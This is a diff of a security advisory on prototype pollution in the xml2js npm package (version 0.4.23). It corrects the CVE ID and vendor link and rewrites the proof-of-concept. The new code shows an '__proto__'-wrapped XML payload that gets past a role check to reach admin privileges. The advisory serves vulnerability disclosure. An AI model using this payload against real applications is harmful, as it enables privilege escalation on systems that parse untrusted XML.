@@ -6,7 +6,7 @@ writer: cbello
 codename: myers
 product: xml2js 0.4.23  -  Prototype Pollution
 date: 2023-02-20 12:00 COT
-cveid: CVE-2023-0835
+cveid: CVE-2023-0842
 severity: 7.3
 description: xml2js 0.4.23          -         Prototype Pollution
 keywords: Fluid Attacks, Security, Vulnerabilities, NPM, Prototype Pollution
@@ -37,7 +37,7 @@ encrypted: yes
 | **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L                                                                                |
 | **CVSSv3 Base Score** | 7.3                                                                                                                         |
 | **Exploit available** | Yes                                                                                                                         |
-| **CVE ID(s)**         | [CVE-2023-0835](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0835)                                               |
+| **CVE ID(s)**         | [CVE-2023-0842](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0842)                                               |
 
 ## Description
 
@@ -64,25 +64,31 @@ object, he will succeed in injecting or editing its properties.
 ```js
 var parseString = require('xml2js').parseString;
 
-let result = {}
+let normal_user_request    = "<role>admin</role>";
+let malicious_user_request = "<__proto__><role>admin</role></__proto__>";
 
-console.log(result.admin);
+const update_user = (userProp) => {
+    // A user cannot alter his role. This way we prevent privilege escalations.
+    parseString(userProp, function (err, user) {
+        if(user.hasOwnProperty("role") && user?.role.toLowerCase() === "admin") {
+            console.log("Unauthorized Action");
+        } else {
+            console.log(user?.role[0]);
+        }
+    });
+}
 
-var xml = "<__proto__><admin>1</admin></__proto__>"
-parseString(xml, function (err, result) {
-    console.log(result.admin);
-});
-
-console.log(result)
+update_user(normal_user_request);
+update_user(malicious_user_request);
 ```
 
 ## Evidence of exploitation
 
-![Explotation-xml2js](https://user-images.githubusercontent.com/51862990/218889830-a9ad98f3-7757-4bbc-9fa8-e711280d34f8.png)
+![Explotation-xml2js](https://user-images.githubusercontent.com/51862990/219061662-8134c98a-e0bf-40c9-9834-426f5213add6.png)
 
 ## Our security policy
 
-We have reserved the ID CVE-2023-0835 to refer to this issue from now on.
+We have reserved the ID CVE-2023-0842 to refer to this issue from now on.
 
 * https://fluidattacks.com/advisories/policy/
 
@@ -104,7 +110,7 @@ Offensive Team.
 
 ## References
 
-**Vendor page** <https://www.npmjs.com/package/mdpdf/>
+**Vendor page** <https://github.com/Leonidas-from-XIV/node-xml2js/>
 
 ## Timeline
 
